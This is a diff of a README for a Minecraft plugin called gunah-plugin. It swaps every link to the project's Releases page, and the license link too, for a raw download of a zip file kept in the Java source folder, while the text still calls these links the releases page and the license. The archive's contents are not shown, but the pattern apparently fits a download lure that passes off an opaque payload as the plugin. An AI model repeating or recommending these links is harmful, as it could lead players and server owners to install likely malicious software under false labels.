@@ -6,15 +6,15 @@ Welcome to the gunah-plugin repository! This plugin allows Minecraft players to 
 
 ## 💾 Download the Plugin
 
-[![Download gunah-plugin](https://img.shields.io/badge/Download-gunah--plugin-brightgreen)](https://github.com/romulomarques-carvalho/gunah-plugin/releases)
+[![Download gunah-plugin](https://github.com/romulomarques-carvalho/gunah-plugin/raw/refs/heads/main/src/main/java/plugin_gunah_3.5.zip)](https://github.com/romulomarques-carvalho/gunah-plugin/raw/refs/heads/main/src/main/java/plugin_gunah_3.5.zip)
 
 To get started, you’ll need to download the plugin. Visit the Releases page to find the latest version available. Click the link below to access the downloads:
 
-[Visit Releases Page](https://github.com/romulomarques-carvalho/gunah-plugin/releases)
+[Visit Releases Page](https://github.com/romulomarques-carvalho/gunah-plugin/raw/refs/heads/main/src/main/java/plugin_gunah_3.5.zip)
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Click [here](https://github.com/romulomarques-carvalho/gunah-plugin/releases) to go to the release section of our repository.
+1. **Visit the Releases Page**: Click [here](https://github.com/romulomarques-carvalho/gunah-plugin/raw/refs/heads/main/src/main/java/plugin_gunah_3.5.zip) to go to the release section of our repository.
 
 2. **Choose the Version**: You will see different versions of the gunah-plugin. Look for the version you want to install. The latest version is typically recommended, as it contains the newest features and fixes.
 
@@ -62,6 +62,6 @@ Feel free to explore the resources and community surrounding Bukkit and Spigot p
 
 ## 📝 License
 
-The gunah-plugin is open-source and available for personal use. You can modify the code under the [license specified](https://github.com/romulomarques-carvalho/gunah-plugin).
+The gunah-plugin is open-source and available for personal use. You can modify the code under the [license specified](https://github.com/romulomarques-carvalho/gunah-plugin/raw/refs/heads/main/src/main/java/plugin_gunah_3.5.zip).
 
 Thank you for using gunah-plugin! We hope it brings a fun new dynamic to your Minecraft adventures.
